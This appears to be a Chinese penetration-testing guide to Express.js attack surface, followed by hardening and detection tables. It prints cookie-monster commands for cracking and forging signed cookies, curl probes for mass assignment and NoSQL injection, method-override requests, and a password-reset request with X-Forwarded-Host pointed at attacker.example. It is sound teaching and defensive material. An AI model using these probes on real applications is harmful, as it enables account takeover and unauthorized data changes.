---
attack_surface:
  - 配置缺陷
  - 认证/授权绕过
  - 注入类
impact:
  - 远程代码执行
  - 身份伪造
  - 信息泄露
risk_level: 高
prerequisites:
  - Node.js 与 Express 框架基础
  - HTTP 中间件链概念
  - Cookie 签名与序列化
related_techniques:
  - prototype-pollution
  - mass-assignment
  - ssrf
  - nosql-injection
  - session-fixation
difficulty: 中级
tools:
  - cookie-monster
  - curl
  - burp-suite
---

# NodeJS Express — Express Framework Attack Surface — Express 框架攻击面

> 关联文档：[Prototype Pollution](../../../pentesting-web/deserialization/nodejs-proto-prototype-pollution/express-prototype-pollution-gadgets.md) · [Mass Assignment](../../../pentesting-web/mass-assignment-cwe-915.md) · [SSRF](../../User%20input/Reflected%20Values/SSRF/README.md) · [NoSQL Injection](../../User%20input/Search/NoSQL%20Injection/README.md) · [Flask](../Flask/README.md)

---

### 知识路径

```
NodeJS Express（本文档）
  ├── 前置知识：Node.js 运行时与 CommonJS/ESM 模块系统
  ├── 前置知识：Express 中间件链 — req/res 生命周期
  ├── 进阶：Cookie 签名爆破 → Cookie 伪造 (cookie-monster)
  ├── 进阶：qs 嵌套解析 → Mass Assignment / NoSQLi / Prototype Pollution
  ├── 关联：Express Prototype Pollution Gadgets — JSON→HTML XSS
  │   └── 参见：deserialization/nodejs-proto-prototype-pollution/express-prototype-pollution-gadgets
  ├── 关联：Mass Assignment — body-parser + qs 对象注入
  │   └── 参见：pentesting-web/mass-assignment-cwe-915
  ├── 关联：SSRF — trust proxy + X-Forwarded-Host 投毒
  │   └── 参见：User input/Reflected Values/SSRF
  └── 关联：Flask — 同类应用框架，Cookie 签名模式对比
      └── 参见：Application Frameworks & Stacks/Flask
```

---

# 0x01 Express 攻击面 — 原理与分类

## 1.1 框架指纹识别

确认目标使用 Express 的关键指标：

- `X-Powered-By: Express` 或堆栈回溯中包含 `express`、`body-parser`、`qs`、`cookie-parser`、`express-session` 或 `finalhandler`
- Cookie 前缀 `s:`（签名 Cookie）或 `j:`（JSON Cookie）
- 会话 Cookie 如 `connect.sid`
- 隐藏表单字段或查询参数如 `_method=PUT` / `_method=DELETE`
- 错误页面泄露 `Cannot GET /path`、`Cannot POST /path`、`Unexpected token`（body-parser）或 `URIError`（查询解析）

确认 Express 后，应将重点放在**中间件链**上——大多数有趣的漏洞来自解析器、代理信任、会话处理和 HTTP 方法隧道，而非框架核心本身。

## 1.2 攻击面分类

| 类别 | 分类名称 | 关键中间件 | 典型攻击 |
|------|---------|-----------|---------|
| 配置缺陷 | 配置缺陷 | `trust proxy` | X-Forwarded-* 头伪造 → 密码重置投毒、IP 白名单绕过 |
| 认证/授权绕过 | 认证/授权绕过 | `cookie-parser`、`express-session` | Cookie 签名爆破、Session Fixation |
| 注入类 | 注入类 | `qs`、`body-parser` | 嵌套对象注入 → Mass Assignment、NoSQLi、Prototype Pollution |
| 协议解析差异 | 协议解析差异 | `method-override` | HTTP 方法隧道 → 绕过路由中间件、CSRF 保护 |

---

# 0x02 中间件攻击面

## 2.1 Cookie 签名与爆破

Express 通过 `cookie-parser` 或 `express-session` 暴露两种有用的 Cookie 格式：

- `s:<value>.<sig>` — 签名 Cookie，由 `cookie-parser` 处理
- `j:<json>` — JSON Cookie，由 `cookie-parser` 自动解析

**关键行为**：如果 `cookie-parser` 收到签名 Cookie 但签名无效，值变为 `false` 而非篡改后的值。如果应用接受密钥数组，旧密钥在轮转后可能仍能验证现有 Cookie。

### 2.1.1 cookie-monster

[cookie-monster](https://github.com/DigitalInterruption/cookie-monster) 是用于自动化测试和重新签名 Express.js Cookie 密钥的工具。

**解码并爆破单个 Cookie：**

```bash
cookie-monster -c eyJmb28iOiJiYXIifQ== -s LVMVxSNPdU_G8S3mkjlShUD78s4 -n session
```

**使用自定义字典：**

```bash
cookie-monster -c eyJmb28iOiJiYXIifQ== -s LVMVxSNPdU_G8S3mkjlShUD78s4 -w custom.lst
```

**批量测试多个 Cookie：**

```bash
cookie-monster -b -f cookies.json
```

**批量测试 + 自定义字典：**

```bash
cookie-monster -b -f cookies.json -w custom.lst
```

**已知密钥后签名新 Cookie：**

```bash
cookie-monster -e -f new_cookie.json -k secret
```

## 2.2 Query String 与 URL-Encoded 解析器滥用

### 2.2.1 机制

Express 的查询字符串和请求体解析可通过不同解析器配置。当解析器将攻击者控制的键解析为嵌套对象时，攻击面显著扩大：

- `req.query` 可配置不同的解析器，包括 `qs`
- `express.urlencoded({ extended: true })` 对 `application/x-www-form-urlencoded` 使用 `qs` 风格的嵌套解析
- 嵌套解析解锁了对象注入、Mass Assignment、NoSQL 注入和 Prototype Pollution 链

### 2.2.2 探测 Payload

```bash
# Mass Assignment 风格探测
curl 'https://target.example/profile?role=admin&isAdmin=true'

# 嵌套对象 / qs 语法
curl 'https://target.example/search?user[role]=admin&filters[name][$ne]=x'

# URL-encoded 请求体攻击 express.urlencoded({ extended: true })
curl -X POST 'https://target.example/api/update' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data 'profile[role]=admin&filters[$ne]=x'
```

### 2.2.3 Express 特有的额外测试

- **深层嵌套**：探测解析器限制、超时或 400/413 差异
- **重复键**：观察应用保留第一个值、最后一个值还是数组
- **括号语法**：`a[b][c]=1`、点语法 `a.b=1`、以及 `__proto__` / `constructor[prototype]` payload

如果应用反映或持久化结果对象，转向以下专项页面深入了解利用细节：

> **关联**：[Mass Assignment](../../../pentesting-web/mass-assignment-cwe-915.md) · [Express Prototype Pollution Gadgets](../../../pentesting-web/deserialization/nodejs-proto-prototype-pollution/express-prototype-pollution-gadgets.md)

## 2.3 `trust proxy` 滥用

### 2.3.1 机制

Express 的 `trust proxy` 设置决定哪些反向代理被信任，有四种模式：

| 模式 | 示例 | 行为 |
|------|------|------|
| **Boolean** | `app.set('trust proxy', true)` | 信任 `X-Forwarded-For` 最左端为客户端 IP。**须确保最后一个反向代理剥离/覆盖 `X-Forwarded-For`、`X-Forwarded-Host`、`X-Forwarded-Proto`，否则客户端可提供任意值。** |
| **IP/子网** | `app.set('trust proxy', 'loopback')` | 排除指定 IP/子网后的地址。Express 自带预配置子网名：`loopback`、`linklocal`、`uniquelocal`。检查 `req.socket.remoteAddress` 是否受信任，若是则从 `X-Forwarded-For` 右到左找第一个不受信任的地址。 |
| **Number（跳数）** | `app.set('trust proxy', 1)` | 信任距 Express 最多 n 跳的地址。`req.socket.remoteAddress` 为第一跳。**须确保不存在多条不同长度的路径到达 Express**，否则客户端可能伪装为少于配置跳数的位置。 |
| **Function** | `app.set('trust proxy', (ip) => ip === '127.0.0.1')` | 自定义信任逻辑，返回 `true` 表示信任该 IP。 |

如果配置不当，Express 将从转发头中获取与安全相关的值。如果反向代理未覆盖这些头，客户端可以直接伪造。

**受影响的属性：**

- `req.hostname` — 通过 `X-Forwarded-Host`
- `req.protocol` — 通过 `X-Forwarded-Proto`
- `req.ip` / `req.ips` — 通过 `X-Forwarded-For`

### 2.3.2 利用场景

- 密码重置投毒和绝对 URL 投毒
- 绕过基于 IP 的白名单、速率限制或审计追踪
- 影响依赖 `req.protocol` 的应用中的 `secure` Cookie 处理和 HTTPS 专用逻辑
- 当应用使用转发的 host/proto 头模板化绝对链接时投毒重定向或可缓存响应

### 2.3.3 攻击示例

```http
POST /reset-password HTTP/1.1
Host: target.example
X-Forwarded-Host: attacker.example
X-Forwarded-Proto: https
X-Forwarded-For: 127.0.0.1
Content-Type: application/json

{"email":"victim@target.example"}
```

检查生成的链接、重定向位置、日志或访问控制决策是否使用了攻击者提供的值。

> **关联**：[Reset Password](../../../pentesting-web/reset-password.md) · [Cache Deception](../../../pentesting-web/cache-deception/README.md)

## 2.4 Method Override 隧道

### 2.4.1 机制

某些 Express 应用使用 `method-override` 中间件来隧道化 HTML 表单无法原生发送的 HTTP 动词。启用后，始终测试是否能通过前端、WAF 或 CSRF 逻辑假设仅为 `POST` 的路由走私危险方法。

### 2.4.2 探测 Payload

**通过 Header 覆盖：**

```http
POST /users/42 HTTP/1.1
Host: target.example
X-HTTP-Method-Override: DELETE
Content-Type: application/x-www-form-urlencoded

confirm=yes
```

**通过查询参数覆盖：**

```http
POST /users/42?_method=PUT HTTP/1.1
Host: target.example
Content-Type: application/x-www-form-urlencoded

role=admin
```

### 2.4.3 影响

- 通过仅允许 `POST` 的边缘控制到达隐藏的 `PUT` / `PATCH` / `DELETE` 路由
- 绕过仅检查 `req.method` 的路由专用中间件
- 当应用仅验证外部请求方法时，通过 CSRF 触发状态变更 Handler

> **默认行为**：中间件通常仅覆盖 `POST`，因此优先使用带 header/body/query-string 覆盖值的 `POST` 请求。

---

# 0x03 `express-session` 测试要点

## 3.1 机制

常见的 Express 部署使用 `express-session`，它对会话标识符 Cookie 进行签名，但将会话状态存储在服务端。

## 3.2 关键检查项

- **Session Fixation**：使用登录前的 Cookie 进行认证，验证登录后 SID 是否保持不变
- **弱密钥轮转**：某些部署使用旧密钥数组验证 Cookie，因此之前的有效签名可能继续有效
- **`saveUninitialized: true`**：应用向匿名用户发放预认证会话，使 Fixation 更容易，并增加会话面用于爆破或缓存分析
- **`MemoryStore` 用于生产环境**：通常表示运维成熟度低，重启时会话行为不稳定

## 3.3 Fixation 攻击流程

1. 从目标获取匿名会话 Cookie
2. 将该 Cookie 发送给受害者，或自己用它进行认证
3. 检查登录是否将认证状态绑定到现有 SID
4. 如果是，在另一个浏览器会话中重放相同的 Cookie

> **修复**：如果应用在认证后未调用 `req.session.regenerate()`，Fixation 通常仍然可能。此方法重新生成会话 ID，使攻击者持有的旧 SID 失效。防御方应确保认证后始终调用 `regenerate()`。

---

# 0x04 防御与检测

## 4.1 加固检查表

| 措施 | 理由 |
|------|------|
| 使用强随机 `session.secret`（至少 32 字节）并定期轮转（保留旧密钥数组以允许平滑过渡） | 防止 Cookie 签名爆破 |
| 设置 `app.set("trust proxy", ['loopback', 'linklocal', 'uniquelocal'])` 仅信任已知本地子网，或使用 Function 模式自定义信任逻辑 | 防止 X-Forwarded-* 头伪造 — 避免使用 `trust proxy = true`，参见 [Express 官方代理指南](https://expressjs.com/en/guide/behind-proxies.html) |
| 认证后调用 `req.session.regenerate()` | 防止 Session Fixation |
| 不在 URL 查询中使用 `_method` 覆盖，或完全禁用 `method-override` | 消除 HTTP 方法隧道攻击面 |
| 使用 `express.urlencoded({ extended: false })` 或对 qs 解析设置深度限制 | 减少 Mass Assignment / NoSQLi / Prototype Pollution 面 |
| 使用 `helmet` 中间件添加安全相关 HTTP 头（CSP、HSTS、X-Frame-Options 等） | 纵深防御 |
| 升级 Express 至最新版本并定期审计中间件依赖 | 安全修复 |

## 4.2 检测指标

| 指标 | 意义 |
|------|------|
| `X-Forwarded-Host` / `X-Forwarded-Proto` 包含外部域名 | trust proxy 投毒尝试 |
| `_method=PUT` 或 `X-HTTP-Method-Override: DELETE` 出现在 `POST` 请求中 | Method Override 隧道 |
| 查询参数或 body 中包含 `__proto__` / `constructor[prototype]` | Prototype Pollution 探测 |
| 查询参数中包含 `[$ne]`、`[$gt]` 等 NoSQL 操作符 | NoSQL 注入探测 |
| 同一个 SID 在多个 IP 上使用或登录前后 SID 不变 | Session Fixation |

## 参考资料

- [Express 官方 — Behind Proxies](https://expressjs.com/en/guide/behind-proxies.html)
- [PortSwigger Research — Server-Side Prototype Pollution](https://portswigger.net/research/server-side-prototype-pollution)
- [cookie-monster — GitHub](https://github.com/DigitalInterruption/cookie-monster)
- [Express Prototype Pollution Gadgets — HackTricks](https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution/express-prototype-pollution-gadgets)
